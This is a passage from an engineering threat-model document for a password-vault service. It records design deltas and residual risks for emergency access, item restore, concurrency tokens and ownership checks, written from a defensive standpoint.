what was true when it was written, and the pointer says where the change
landed. §6yy also records the half PR0 did not see — that the owner's screen
rendered neither stop on a released policy, so the argument two paragraphs
below was true of the service and false of the product.)

**THE READ IS A ZONE A TRUST-BOUNDARY CHANGE AND IS TREATED AS ONE.** Every
vault credential to date has had one subject: `vault-session.guard.ts` refuses
whenever `row.user_id !== caller.userId`, and `vault_sessions` has no notion
of acting for another user. M27 makes the server hand user B ciphertext
belonging to user A for the first time in Zone A. **The credential layer does
not change.** The rejected design was a `subject`/`on_behalf_of` column on
`vault_sessions`: it would widen the guard every item route depends on, to
serve one route, which is the "weaken a zone boundary to simplify a feature"
move docs/01 forbids. Instead the grantee presents their OWN vault session —
they must already have one, because their recovery private key is wrapped
under their own master key — and the read's authority comes from the POLICY
ROW: a row where `grantee_user_id = caller.userId` and `status = 'released'`,
re-checked against the settlement gate inside the transaction. Subject and
object differ in one handler's authorization, not in a credential.
`authz.service.ts` already named this as the place it would happen: "there are
no beneficiary or grantee reads in Zone A ... That changes when emergency
access lands, and it changes here, not by loosening a policy elsewhere." The
Cedar change is a grantee attribute in the vault's own domain; `owner.cedar`
is not touched.

**RELEASE BECOMES RE-COLLECTABLE, AND THE ARGUMENT IS THAT NOTHING WAS EVER
DESTROYED.** `markReleased` is `UPDATE ... SET status = 'released',
released_at = $2` and nothing else: `platform_part`,
`wrapped_master_key_recovery` and `key_share_ct` all survive it untouched.
"One-shot" was therefore a status check, never a cryptographic one-way door —
and what it bought was that closing a tab spends an escrow for nothing.

**THE DELTA IS TWO GUARDS, NOT ONE, AND THE FIRST DRAFT OF THIS SECTION SAID
ONE.** Removing only the `already_released` throw at the release site drops
the caller into the very next line — `status !== 'waiting' || !releases_at` →
`not_requested` — so the escrow stays exactly as uncollectable and now reports
it under a token that means something else, which is the
two-failures-one-token defect this document forbids. `request` cannot rescue
it either: `blockReason` returns `already_released`, and `markRequested` is
the only writer of `status = 'waiting'` anywhere. So the release path must
admit `status IN ('waiting','released')` with `releases_at` set and elapsed,
and PR3a owns changing `emergency.int.spec.ts`'s `release › is one-shot: the
escrow is spent`, which asserts today's dead end on both the second release
AND the follow-up request. (**DONE in PR3a**, and only the first half was
reversed: that test is now `is RE-COLLECTABLE: a second collection still opens
the vault` and puts the second collection through the same reconstruction as
the first, while the follow-up REQUEST stays refused with `already_released`.
The token there is unchanged because the CONDITION is unchanged — `markRequested`
is still the only writer of `status = 'waiting'`, so a re-request would restart
a waiting period the grantee has already served — and what changed is that its
remedy is now "collect it" rather than nothing.) Found by the M27 PR0 review, which reproduced it
against a real database rather than reading the guard order.

**AND THE PROTECTIVE ACTION HAS TO MOVE WITH IT, WHICH THE FIRST DRAFT GOT
BACKWARDS.** That draft argued the change was safe because `revoke` carries no
status guard, so the owner can always revoke a released policy — true, and not
the point. `revoke` is `@UseGuards(StepUpGuard)`; the ONE-TAP action is
`deny`, deliberately `CallerGuard` only because "a step-up prompt between the
owner and 'stop this' is a control that argues with itself" — and `deny`
REFUSES on a released policy. Making release repeatable behind a bare account
session while leaving the only ungated stop unavailable would put the
permissive action one call away and the protective one behind fresh MFA: the
docs/03 rule inverted, in the paragraph that cited it. **So `deny` is admitted
on a released policy**, and it means what it has always meant — sticky, no
cooldown, no further collection until the owner re-arms. It cannot un-release
what the grantee already holds; what it does is end the arrangement's ability
to hand over more, with one tap, which is exactly the property re-collection
would otherwise have taken away.

Every collection re-notifies the owner, re-emits `vault.emergency.released`,
and re-runs the settlement gate inside the transaction, so a second collection
is MORE visible than the first, not less.

**THE RESTORE HALF IS TWO SHAPES, AND THE SECURITY ARGUMENT RESTS ON THE
SECOND.** Undelete flips `deleted_at` back on a `vault_items` row. Version
restore reads a prior full row image out of `vault_items_versions` and writes
it forward — **the image INCLUDING its `blob_version`, which is the whole
reason this works and is spelled out because a reader of the first draft (the
author) took "writes it forward" to mean the ciphertext at a bumped version
and convinced himself the design was broken.** `itemContentAad` binds
`blob_version`, so a blob sealed at N opens only when the caller is told N;
`to_jsonb(OLD)` captures `blob_ct` and `blob_version` as a MATCHED PAIR,
`vault_items` constrains `blob_version` only to be positive, and the client
builds its AAD from the version the SERVER served. Restore the pair and it
decrypts; restore the ciphertext alone at a fresh version and it never will.
The server therefore never moves a blob between versions, and no re-encryption
step is needed — the shape that WOULD need one is the shape that does not
work. Only the second one answers `packages/auth-guard/src/session.ts`, which
refuses `deleteItem` to the extension audience BECAUSE an overwrite is
"recoverable" — a refusal justified by a capability nobody has built, and the
bullet recording that sat where the residuals fence could not see it (below,
and §6j). An extension can overwrite every item and cannot delete one, so the
recovery that argument needs is version restore specifically; a restore
surface that only undeleted would leave the sentence exactly as unsupported as
it was then. (PR1b BUILT IT — §6ww. This paragraph is left in PR0's tense
because it is a dated delta and records what was true when it shipped; the
forward pointer is here so a reader does not take the present tense as a
current claim about the tree.)

**A SOFT-DELETED ROW DOES NOT SAY WHETHER IT CAN STILL BE DECRYPTED, AND THAT
IS WHAT PR0 FIXES.** `VaultService.reset` soft-deletes every item with the
SAME `deleted_at` stamp `deleteItem` uses, then replaces the keyset and clears
the recovery keypair — so those blobs are cryptographically dead, and no
column distinguishes them from a row the owner deleted by hand a minute
earlier. A restore list built as `WHERE deleted_at IS NOT NULL` would offer
rows that can never decrypt, and the failure would arrive as a silent AEAD
error on click: the shape where a control firing and an outage wear the same
face. `vault_items` therefore gains `deleted_reason`, CHECK-tied to
`deleted_at`, and the restorable corpus is DERIVED from that CHECK rather than
hand-listed.

**WHY A COLUMN AND NOT `app.change_reason`.** The version trigger already
reads that GUC into `vault_items_versions.reason`
(`packages/db/src/conventions.ts`), which looks like the same fact and is not.
Three reasons, in order of weight. The GUC lands in the SHADOW table, and a
restore LIST queries live rows — wrong table for the question. The shadow row
for a soft delete is captured BEFORE the UPDATE, so it holds the image with
`deleted_at` still NULL; the reason would describe a row that does not yet
look deleted. And a GUC is per-transaction state somebody has to remember to
set: no service in this repo sets it, in any cluster, after twenty-five
milestones — `vault_items_versions.reason` has been NULL for every row ever
captured, and nothing went red. A CHECK-enforced column cannot be forgotten.
The GUC staying unset repo-wide is a separate observation and is not closed
here.

**THE FENCE BUILT TO MAKE DEFERRALS VISIBLE COULD NOT SEE THIS MILESTONE'S
HEADLINE ITEM.** §6j:1623 recorded "there is no restore surface", assigned it
to "the operator platform (TB7)", and carried no disposition tag — while
`threat-model-residuals.spec.ts` stayed green. Two independent misses: TB7
shipped as M21 without the surface, and the bullet was never in the fence's
corpus at all. §6j organises by PR (`**Added by PR3a (origin matching).**`),
that lead-in is in neither `REGION_MARKERS` nor `NON_REGION_LABELS`, and the
classification assertion skips any lead-in whose label does not itself say
"residual" — so the bullet was reachable only by the language rule, and it
used none of the marker phrases. A fence whose input is narrower than its
claim goes green for the same reason it is wrong. **The corpus is now stated
rather than assumed:** every §6 bullet outside it is declared as data, per
lead-in, with a count — 30 lead-ins, 132 bullets as PR0 measured them,
overwhelmingly "controls now shipped" and "what PR N changes". A bullet added
under any of them changes a count and turns the fence red, so the author must
either tag it or record that they looked. The floor is per-lead-in rather than
per-file, because a total passes happily while one lead-in goes blind.

### Residuals

- **[OWNER: M28]** *§5.2 scope limits stay deferred: the reader is
  all-or-nothing.* A released grantee reads every item, because the master key
  they reconstruct opens every item key. Per-item keys are in place, so
  granting a contact a vault SUBSET is a later grant feature rather than a
  re-architecture, and it is the same capability M28 builds for
  owner-initiated sharing. Stated here rather than discovered during the
  reader's own review: M27 ships the all-or-nothing read deliberately, and the
  owner's compensating visibility is that the read is audited and notified.
- **[OWNER: M39]** *A grantee enumerating a decedent's vault produces a clean,
  quiet trail.* The decrypt-rate detector pins its counted set to exactly
  `crypto.field.decrypted`, so `vault.emergency.items_read` is bounded by no
  rate limit and watched by no detector anywhere. Logging it is not detecting
  it, and the two are recorded apart. Sits with the other Zone A hardening
  work rather than with the reader, because the detector is audit's, not the
  vault's.
- **[ACCEPTED]** *`emergency_access_policies` gets no discriminator, and the
  category was checked rather than assumed.* It soft-deletes in two places —
  `softDeleteAllForOwner` and, less visibly, `markRevoked`, which sets
  `deleted_at` as a rider on a status update and carries no `AND deleted_at IS
  NULL` guard. Both would need the same discrimination IF a policy restore
  were ever built. None is, in M27 or in the queue, and a discriminator on a
  table with no restore consumer is the zero-caller surface this repo keeps
  paying for. The asymmetry is deliberate and named so the next person to
  build a policy restore starts from it.
- **[ACCEPTED]** *A restore cannot revive an escrow.* `reset` HARD-deletes
  `emergency_access_configs`, so items and policies can come back while the
  wrapping they were sealed under cannot. Restoring a policy whose config row
  is gone would yield a policy pointing at a destroyed wrapping — which is
  exactly why the restorable corpus excludes reset-retired rows rather than
  filtering them at read time.
- **[CLOSED: §6hhh]** *Thirteen residuals in the corpus are owned by a milestone
  that has already shipped, and the derivation that finds them was blind.* PR0
  closed the case of an UNTAGGED residual outside the corpus; this is its
  mirror — a TAGGED one whose owner finished. `OWNERS` is derived from every
  row of docs/04's table, closed rows included, so naming a completed milestone
  passes the vocabulary check exactly as naming a live one does. The count is
  pinned rather than driven to zero: deciding whether a later slice of the same
  programme still owes each item is a sweep, not a line in this PR. **THE
  BLINDNESS IS CLOSED BY M40 PR0 — §6ddd — AND THE SWEEP IS NOT.** Every queue
  row now declares a lifecycle token, so a finished milestone can no longer
  answer the completion question with a different word or with silence; applying
  that rule found three finished milestones this derivation had never seen (M24,
  M27, M44), none of which owns a residual, so the thirteen were unchanged AT M40
  PR0. **M40 PR3 then adjudicated all thirteen and the stale count is ZERO**
  (§6ggg); the figure here is left as it was measured, dated, because a delta
  records what its own change found.
  **THIS BULLET HAS NOW BEEN WRONG TWICE, both times about a milestone it
  names.** M27 PR5 corrected the first: it said "M21's eighteen and M24's", and
  M24 owns NO residual at all — zero `[OWNER: M24]` tags in this document. The
  second is the sentence that replaced it, which called M21's eighteen the
  sharper half of the same defect "because that queue row says APPROVED and
  never gained a completion status". M21 has NOT shipped — docs/04 records its
  PR5, documents evidence content plus the legal-hold lift ceremony, as NOT YET
  SHIPPED — so its row was honest and its residuals were never in this
  category at all. They are a different defect, since M21's one outstanding PR
  does none of them, and the sweep this bullet owns is where they get
  adjudicated. (Eighteen when PR0 measured; seventeen once PR1 re-tagged one of
  them to M41; zero once PR2 adjudicated the rest — which is why these sentences
  name the tag, not the number.)
  A bullet about ownership accuracy asserting a count nobody checked is the
  defect it describes; asserting the same thing twice about the same milestone
  is that defect with a pattern.
  **CLOSED BY M40 PR4** (§6hhh), on demonstrated behaviour rather than on the
  presence of the mechanism — the rule this milestone learned the hard way at
  §6fff. Three things were shown rather than asserted. The derivation is no
  longer blind: it reads a lifecycle token off all 27 queue rows and returns SIX
  completed milestones, where before M40 PR0 it saw three. The sweep is
  finished: `[OWNER: M22]` and `[OWNER: M23]` both count zero. And a NEW stale
  tag still reddens — re-owning a live residual to M22 fails `no residual is
  owned by a milestone that has already SHIPPED` by name, so the assertion that
  replaces this bullet is load-bearing rather than vacuous, which is the
  property M40 PR3 had to build a positive control to keep.
- **[ACCEPTED]** *The reason fence binds a route's label to its keyset
  behaviour, not to which rows it retires.* A `deleteItem` that retired every
  item a user owns would label them `user_delete`, which is CORRECT for a
  route that leaves the keyset alone, and `restorable-corpus.spec.ts` would
  stay green. The M27 PR0 review demonstrated that mutation; it survives
  because it is unfaithful to the fence's claim rather than because the claim
  is weak. No fence in M27 bounds the SCOPE of a retirement, and PR1's
  undelete is where that question actually lands.
- **[ACCEPTED]** *The out-of-corpus census counts bullets per lead-in, so a
  one-for-one swap under the same lead-in preserves its count.* Deleting one
  bullet and adding another beneath the same heading is invisible to it.
  Keying the census on each bullet's opening phrase would close that and would
  mean hand-listing 132 prose sentences beside a document that grows — the
  defect this repo names most often. The bound is stated rather than left to
  be found, on the same terms the fence's own docstring states its
  predecessor.

## 6vv. Threat-model delta — M27 PR1a, the concurrency token (2026-08-22)

**ONE INTEGER WAS DOING TWO JOBS, AND RESTORE IS WHAT FORCED THEM APART.**
§6uu settled that version restore writes a prior row image forward INCLUDING
its captured `blob_version`, and that reasoning is unchanged and correct:
`itemContentAad` binds the version, `to_jsonb(OLD)` captures ciphertext and
version as a matched pair, and restoring the pair is the only shape that
decrypts. What it did not carry through was the second job that same column
was doing. `updateItem` compared `If-Match` to `blob_version` by strict
equality and wrote `blob_version + 1`, and equality is a sound change detector
ONLY while a value occurs at most once per row's life. Nothing in the schema
said so — the invariant lived in a single `+ 1` at one call site, which is the
shape this repo calls a convention rather than a control.

**THE LOST UPDATE, CONCRETELY.** An item sits at version 5 and a device has
the editor open holding 5, for up to the fifteen-minute vault session. A
second device restores the version-3 image, so the live row is at 3. It edits
twice: 3 to 4, 4 to 5. The first device now submits `If-Match: 5` — and `5 !==
5` is false, so there is no conflict, no error, and its stale blob lands at 6,
AAD-bound to 6, decrypting perfectly. The restore and both edits are gone, and
the audit trail records a routine `vault.item.updated`. That is precisely the
lost update `If-Match` exists to prevent, and it is unreachable while versions
only ever increase. Found by the M27 PR1 design fan-out, on a
refute-by-default verifier that could not refute it.

**THE SPLIT.** `vault_items.revision` (migration 005) takes the concurrency
job. `blob_version` keeps the AEAD binding alone and is then FREE to move
backwards, which is not a defect but a signal: a version that goes DOWN is a
restore, and docs/03 §6a's rollback-detection residual — re-owned to M39 by
PR0 — has nothing else to look at today. `If-Match` carries `revision`; the
client still seals against `blob_version + 1`, because that is what the server
will store. Two numbers travel on every item, and the wire says which is
which.

**THE INVARIANT MOVED INTO THE TABLE.** `trg_vault_items_revision` ASSIGNS
`OLD.revision + 1` on every update rather than validating a value the
statement supplied, so no writer can forget to advance it, no writer can
choose it, and a restore cannot reuse a token already issued. Soft delete,
undelete and the ordinary update all advance it for free. A CHECK cannot
express this — it sees one row version, not a transition — which is why it is
a trigger. Proved by reverting the service to compare `blob_version` again:
exactly one named assertion reddens, and the three `If-Match` tests that
predate this change stay GREEN, which is the same fact from the other side.
They were driven only through states where the two numbers agree, so they
never could have told the difference.

**THE FIXTURE PROBLEM THIS CREATES, AND WHY THE TEST LOOKS ODD.** On a row
that has only ever been created and updated, `revision` and `blob_version`
advance together and are ALWAYS EQUAL. Every assertion driven through those
states passes identically whichever column the service compares, so the change
is unfalsifiable until a row exists where they differ — which is exactly the
state M27's restore creates, a PR later. The integration test therefore forces
the divergence with SQL rather than waiting for it, and asserts the
disagreeing arm in both directions: the blob version is REFUSED as a token and
the revision is ACCEPTED. A change whose proof arrives a PR after the change
is a change nobody checked. Every client double was given a revision that
deliberately differs from its blob version for the same reason.

**CHECKED AS A CATEGORY — AND THE FIRST VERSION OF THIS PARAGRAPH WAS NOT.**
Item content is the only additional-authenticated-data construction in this
repo that binds a mutable per-write counter, so no other table carries this
conflation and no other migration is owed. That claim is correct and it
survived checking. The sentence that supported it did not: it said "derived
rather than assumed" while hand-listing six builders, two of which
(`fieldAad`, `aliasAad`) do not exist and never did, and it omitted every AAD
built inline at a call site rather than by a named function — which is all of
Zone B's. A hand-list is what the word "derived" was doing the work of hiding.
The set now lives in `packages/vault-crypto/test/aad-bindings.spec.ts` as data,
compared against the tree in both zones and in both directions, with the
counter property asserted mechanically rather than by eye. Prose does not
restate it; the fence is the citation.

**AND ONE REFUSAL WHERE THERE WERE TWO.** Every item route that NAMES an id —
`GET`, `PUT` and `DELETE` on `/v1/vault/items/:itemId`, which is the whole of
that set and is derived from the controller by the test rather than listed by
it — read its row by id ALONE and then asked Cedar, which answers `403
forbidden`, so a missing item gave 404 and somebody else's gave 403. That pair is an existence oracle for
any item UUID that leaks, against this document's uniform-404 rule, and the
read itself had already answered a question about another user's data before
any gate ran. Ownership is now FUSED into the statement (`WHERE id = $1 AND
user_id = $2`), so the row never arrives to be refused distinguishably. Cedar
still decides whether this principal may take this action — the layer M27
PR3's grantee read needs — but it no longer decides ownership. The test
compares the two responses as WHOLE VALUES, because a status match with a
different body is still a discriminator.

**THE SAME RULE, ASKED OF THE REST OF THE CATEGORY.**
`emergency_access_policies` had the identical split, in the same service:
`requireOwnerPolicy` read by id and let Cedar answer 403, while
`requireGranteePolicy` DIRECTLY BELOW IT in the same file already answered a
uniform 404 and said why in its own comment. One behaviour, two spellings, and only one of
them right. Both arms are now fused, and the two unfused lookups they used are
DELETED rather than left available — including `EmergencyRepo.findLiveById`,
which had zero callers before this change and was already dead. `ai-assistant`
was checked and is correct: its authz throws `NotFoundException`, and it is
the precedent this follows.

### Residuals

- **[OWNER: M41]** *`POST /v1/vault/items` remains an existence oracle across
  users, and the paragraph above does not reach it.* `vault_items.id` is a
  global `PRIMARY KEY` and the client supplies it, so creating with an id
  another user already holds raises a unique violation and answers `409
  item_exists`, where an unused id answers `201`. The two answers differ, and
  that difference is the oracle — for a soft-deleted row as much as a live one,
  since no row is ever removed. Three review lenses raised it independently and
  neither refuter could refute it. NOT fixed here: closing it means per-user
  uniqueness, which is a primary-key change on a table carrying a version
  capture trigger and its own history — a schema decision to propose, not a
  drive-by in a PR about a concurrency token. The practical reach is bounded by
  the ids being unguessable 122-bit UUIDs, so the probe confirms an id the
  caller already holds rather than enumerating anything; it is recorded because
  the uniform-404 rule in this document is categorical and this is a real
  exception to it. Pinned by a characterization test in `vault.int.spec.ts` so
  the behaviour cannot change in either direction unnoticed.
- **[OWNER: M41]** *`plaid` answers the same 403-vs-404 pair on two routes,
  and this PR did not reach into it.* `sync` and `revoke` both call
  `requireItem` (404 when missing) and then `assertCan` (403 when it is not
  yours), which is the defect fixed here, in another service. It is recorded
  rather than fixed because widening a vault PR into the Plaid service is the
  scope creep this repo asks authors to propose rather than perform. The reach
  is narrower than the vault's was — a Plaid item id is server-minted and
  never leaves the owner's own surfaces — but the discriminator is the same
  one. **THE OTHER HALF OF THIS CATEGORY IS §6e**, six routes on `documents`,
  re-owned to this milestone by M40 PR1; §6eee enumerates all eight and records
  that there are no others in the repo.
- **[ACCEPTED]** *A `blob_version` that moves backwards is a signal nothing
  yet reads.* The split makes a downward version legible as a restore, and
  that is offered as the material M39's rollback detection can use; PR1a ships
  no detector, no client-side last-seen state and no alarm. Stated so the next
  author does not read "gives M39 a signal" as "M39 is closer to done".
- **[ACCEPTED]** *Two numbers on the wire is a larger client contract than
  one.* Every item response now carries `blobVersion` and `revision`, and a
  client that sends the wrong one as `If-Match` gets a 409 rather than a
  silent failure — the fail-closed direction — but nothing structurally
  prevents a future client from reading the wrong field. The compensating
  control is that every double in the tree gives the two DIFFERENT values, so
  the mistake cannot pass a test.

## 6ww. Threat-model delta — M27 PR1b, the restore reader (2026-08-23)

**THE REFUSAL IN `session.ts` NOW RESTS ON SOMETHING.** Since M16 that file has
refused `deleteItem` to the extension audience on the grounds that an overwrite
is "recoverable", and until this PR nothing in the product could recover one:
`vault_items_versions` had captured full row images since M6 and had no
production reader. A security argument whose premise is a capability nobody
built is an argument resting on nothing, and it stood for eleven milestones.
`GET /v1/vault/items/:itemId/versions` and `POST
/v1/vault/items/:itemId/restore` are that reader and that verb. The half this
PR does NOT close is reachability: the routes are live, the SCREEN is PR2, and
§6j stays open and owned by M27 on exactly that difference rather than being
retagged early. (**PR2 BUILT IT — §6xx**, and §6j is retagged there. This
paragraph keeps PR1b's tense, on the same precedent §6uu's PR0 paragraph
follows: what a delta recorded at the time it was written is evidence about
the order things happened in, and back-dating it would erase the very gap the
sentence exists to name.)

**VERSION RESTORE, NOT UNDELETE, IS THE ONE THAT ANSWERS IT.** Both shapes
ship, and the tests say which is which. An extension can overwrite every item
and cannot delete one, so a restore surface that only undeleted would leave
`session.ts` exactly as unsupported. Undelete flips `deleted_at` and
`deleted_reason` together — migration 004's CHECK ties them, so clearing either
alone is a refused statement rather than a half-done restore. Version restore
writes a prior image forward: `blob_ct` and `blob_version` TOGETHER, because
`itemContentAad` binds the version and the pair is what decrypts. That is what
M27 PR1a's `revision` split was for — the live `blob_version` moves DOWN on a
restore, which strict equality cannot be a change detector over.

**THREE COLUMNS ARE WRITTEN AND THE REST IS AN ABSENCE.** The restore sets
`blob_ct`, `blob_version` and `item_type` and names nothing else, so `id` and
`user_id` (identity), `created_at`, `updated_at` and `revision` (trigger-owned)
and — the one that matters — `deleted_at` / `deleted_reason` cannot travel. An
image captured at an UNDELETE holds the row as it was WHILE RETIRED, and
writing that forward would be a restore that deletes the item. The reader
excludes such images at the source (`row_data->>'deleted_at' IS NULL`) rather
than checking at the call site, so the arm cannot be reached instead of being
refused when it is, and `vault.item.restored` is truthful by construction.

**THE HANDLE IS `revision`, WHICH IS A SECURITY CHOICE.** A reader has to name
an image, to page and to say which one to put back. `version_seq` is the shadow
table's BIGINT IDENTITY, shared by every user of the table, and this service's
cursors are base64url of PLAINTEXT — so paging on it would publish a decodable
platform-wide write counter and put a sequential id on the wire against
CLAUDE.md's rule. `revision` is per-row, never reused, and already the client's
`If-Match` token: one handle rather than a second spelling of "which image".
Migration 006 adds it to `vault_items_versions` as a GENERATED column derived
from `row_data`, so it cannot disagree with the image it names, needs no change
to the shared `versionsTableSql` capture function, and is correct for rows
captured before it existed. Images predating migration 005 have no `revision`
key and are therefore NULL: unnameable, and so unrestorable — the fail-closed
direction.

**RESET RETIRES IN ONE STATEMENT, BECAUSE UNDELETE IS A VERB THAT MOVES ROWS.**
The first shape soft-deleted the live rows and then relabelled the retired ones
— two predicates that partition the table only while nothing moves between
them. `undeleteItem` moves a row from the second set to the first, so a row
undeleted in that gap was matched by neither and came out of the reset LIVE,
holding a blob the keyset replaced in the same transaction had just made
undecryptable: a dead row wearing a live one's face, which is §6uu's confusion
from the other direction. Nothing could produce that interleaving before this
PR, so the milestone created the window and closes it here. The retirement is
now a single `UPDATE ... FROM` over a `FOR UPDATE` CTE, so a concurrent writer
is waited for and its row re-checked against the version it committed;
`reset-retirement.int.spec.ts` drives two real transactions and commits the
undelete at the moment that used to be fatal.

**OWNERSHIP IS FUSED, AND THE SHADOW TABLE HAS NO OWNER COLUMN.**
`vault_items_versions` records ownership only inside `row_data`, so a reader
keyed on `row_id` alone answers a question about someone else's data and then
filters — the ordering CLAUDE.md forbids. The reader drives from `vault_items`
with `(id, user_id)` fused and reaches the shadow table only with a `row_id`
the caller has been proven to own. Zero rows is the uniform 404; an owned item
with no history is 200 and an empty list, because "not yours" and "nothing
captured yet" are different facts and only one is the caller's business. The
image's own `user_id` is projected and asserted against the live row, and a
disagreement RAISES rather than filtering: item ids are client-supplied, so the
pairing is only as durable as the guarantee that no row is ever removed and no
id reissued. It cannot fire today, which is why it throws — a silent filter
would turn the day that guarantee breaks into a surface quietly showing fewer
versions.

**NONE OF THE FOUR ROUTES CARRIES `StepUpGuard`, AND THE ASYMMETRY IS THE
POINT.** `deleteItem` is the one item route that does. `updateItem` — which
destroys the previous content of an item — carries `VaultSessionGuard` alone
and is open to the `extension` audience. Putting a fresh factor in front of the
UNDO of that write, while the write itself needs none, would make the
protective action harder than the permissive one in the milestone that exists
to honour that rule. All four routes are refused to the `extension` audience:
the audience that can overwrite is not the audience that can roll back.

**PR0'S DISCRIMINATOR HAD A HOLE, AND THIS PR CLOSES IT.** Migration 004 added
`deleted_reason` so a restore list would never offer a blob the keyset had
outlived. `reset` retired only the LIVE rows, so an item the owner deleted
BEFORE a reset was never touched by it and kept saying `user_delete` —
restorable — while the keyset that opened it was replaced in the same
transaction. The list would have offered it and the failure would have arrived
as a silent AEAD error on click: a control firing wearing the face of an
outage, which is the precise shape 004 exists to prevent. Found by PR1b's
design fan-out, by two lenses independently, and proved by reverting the fix
and watching a named assertion redden.

**AND THE FIRST FIX FOR IT WAS ITSELF WRONG,** which is why the mechanism is
the single statement described above rather than the obvious one. Relabelling
the already-retired rows in a SECOND statement closes the hole for a table
nobody is writing to and opens a race for one somebody is: the two predicates
tile only while no row moves between them, and this same PR shipped the verb
that moves them. The review caught it; `reset-retirement.int.spec.ts` now
drives the interleaving that used to be fatal.

### Residuals

- **[ACCEPTED]** *A refused restore emits no audit event.* `AUDIT_ACTIONS` is a
  closed vocabulary and a consumer that predates a member drops every instance
  of it silently, so a `vault.item.restore_refused` would cost a consumer
  deploy ahead of its producer — a PR0 change, not a PR1b one. The consequence
  is that repeated failed restores against another user's item ids are
  invisible, which is bounded by the fact that they are indistinguishable 404s
  carrying no information to begin with. On the same terms as §6uu's M39
  residual for `vault.emergency.items_read`: logging is not detecting.
- **[ACCEPTED]** *A restore is a rollback primitive and nothing watches it.*
  Putting a prior version back is exactly how an attacker with an unlocked
  vault would revert a password change the owner had just made. The event is
  emitted with both revisions in its detail, so the material for a detector
  exists; no detector does. This is the same gap §6a records for `blob_version`
  moving backwards, now reachable through a supported route rather than only
  through operator SQL, and it is why the routes stay out of the `extension`
  audience.
- **[ACCEPTED]** *The versions reader pages the history of an item retired by a
  reset, and says nothing about it.* `listItemVersions` consults
  `deleted_reason` nowhere, so the images of a row the reset killed are
  readable. What is disclosed is ciphertext under a destroyed key — dead when
  the reset committed, not by this route — and it cannot be acted on: a restore
  locks the LIVE row, so every one of those items answers the same uniform 404
  as an id that names nothing. The disclosure is bounded by an ABSENCE rather
  than by a filter on the reader, which is the direction this repo prefers, and
  the 404 pairing is pinned by test. A filter would additionally have to decide
  what to tell the owner about their own history, which is a screen question
  PR2 owns. **ANSWERED BY PR2 (§6xx): it tells them nothing, because no screen
  can reach the row at all.** A reset retires every item, so a reset-killed row
  is off the vault list and has no History button; and it is off Deleted items
  too, because `RESTORABLE_REASONS` is derived from `REASON_DISPOSITION`, which
  classes `vault_reset` as unrestorable. The row is on NO surface. That is a
  stronger answer than the one this bullet first gave — an earlier draft said
  Deleted items offers it with `ITEM_UNRESTORABLE` as the sentence, which is
  false about the steady state. `ITEM_UNRESTORABLE` remains reachable, but only
  through a RACE: a row listed while it still said `user_delete`, undeleted
  after a reset relabelled it. The client handles that token and the screens
  spec pins it. The versions reader keeps no filter and gains no caller.
- **[OWNER: M41]** *The versions reader returns every prior ciphertext, and a
  crypto-shred does not reach further than it did.* Restoring is bounded by the
  keyset, so a shredded vault's images are dead — but a version list is a
  larger disclosure surface than a single item read, and `vault.item.accessed`
  is emitted once for the page rather than once per image. The count is not in
  the detail, so a burst detector sees one access where a caller took fifty
  ciphertexts. Owned by the milestone that already carries the read-before-authz
  sweep, since both are about what a read reports rather than what it permits.

## 6xx. Threat-model delta — M27 PR2, the owner's restore surface (2026-08-23)

**§6j IS CLOSED HERE, ELEVEN MILESTONES AFTER IT WAS WRITTEN.** PR1b gave
`session.ts`'s refusal a capability to rest on; this PR gives the owner a way to
reach it. Two screens on the isolated origin — Deleted items and one item's
History — call all four restore routes with the owner's own vault session, an
audience the extension cannot hold. The property that makes the refusal sound is
now stated twice and enforced once: the credential that can overwrite an item
cannot roll one back, and the credential that can roll one back is minted only
by an SRP unlock on a different host.

**THREE REFUSALS THAT USED TO SHARE ONE SENTENCE.** Before this PR the client
mapped 403, 404 and 409 to `FORBIDDEN`, `NOT_FOUND` and `CONFLICT`, so a stale
concurrency token, a version that had been superseded, and an item whose keyset
was destroyed by a vault reset all reached the reader as "reload and try again".
One of those three can never succeed on retry. `ITEM_UNRESTORABLE` now says the
contents were destroyed when the vault was reset and does NOT say "try again",
because sending someone back to press the same button forever is the failure
mode the M9 rule exists to prevent. `VERSION_NOT_FOUND` deliberately does not
borrow `NOT_FOUND`'s sentence: the ITEM is on screen while its version is gone,
and "that item is no longer there" would be a false statement about something
the reader can see. The mapping is a table in `client.spec.ts` with four
positive controls, so an added token cannot quietly inherit a neighbour's copy.

**THE ONE ACTION ON THIS SURFACE THAT CAN DESTROY SOMETHING IS THE ONE THAT IS
WITHHELD.** A version whose blob this client cannot open is still listed — the
owner is entitled to know their past exists — but it carries no restore button.
Putting an unopenable image back would write ciphertext nobody can read over
live content, converting a readable item into a dead one through a supported
route. Undelete keeps its button on an unreadable row, and the asymmetry is the
point: undelete writes no ciphertext at all, so it cannot make anything worse.

**HISTORY IS REACHED FROM THE LIST AND NEVER FROM THE EDIT FORM, AND THAT IS A
CORRECTNESS BOUNDARY RATHER THAN A LAYOUT CHOICE.** This origin has no dirty
check, no cleanup hook and no confirm dialog, so entering history from inside a
populated form would drop a half-typed secret with nothing said. The return path
matters more: handing a reader back a PRE-restore `OpenedItem` would leave the
next save sealing under a `blobVersion` the row no longer has, and the item would
land permanently unopenable with nothing in the response saying so. Both screens
return to the vault LIST, which re-reads.

**THE TWO INTEGERS STAY IN THEIR OWN LANES ACROSS THE WIRE.** `If-Match` carries
the LIVE row's `revision`; the request body carries the IMAGE's. The screen spec
pins both against a fixture where the two genuinely disagree and where no image
ever carries the live revision — the capture trigger reads `OLD`, so the version
the reader is already at has no image at all. That absence is why every returned
row may be offered without a "current" filter: the server's no-op arm is
unreachable from this screen by construction rather than by a predicate someone
has to maintain.

**THE HISTORY CURSOR IS OPAQUE AND IS HANDED BACK VERBATIM.** It is never
parsed, never rebuilt from a row, and never interpolated into the path — the
query is APPENDED so the route template stays legible to the consumer fence.
That fence was itself the finding, though not in the way this paragraph first
claimed. Its STALE-EXEMPTION SWEEP — the half that asks whether an exemption has
outlived its reason — compared each consumer's RAW template against the route,
while the main consumer check already applied the edge rewrites through
`fileMatchesPath`. So a caller on this origin, which addresses `/api/vault/…` and
reaches `/v1/vault/…` only through the rewrite, was invisible to the sweep, and
`EXEMPT_RESTORE_SURFACE` would have sat green forever after its stated deadline
passed. The sweep now calls `fileMatchesPath` too, and the exemption is DELETED
rather than emptied. MEASURED, with the consumer written: the old sweep named
ZERO of the four routes and the new one names four. (An earlier draft of this
sentence said "three and missed the fourth". That is a real measurement of a
DIFFERENT defect — my own `${query}` interpolation, which collapsed the last
segment to `versions:p` — and attaching it here was a second copy of a number
landing beside the wrong mechanism, which is the habit this repo keeps closing.)

**AND THE UNLOCK ITSELF NOW ELEVATES, WHICH IT HAD NEVER DONE.** Driving the
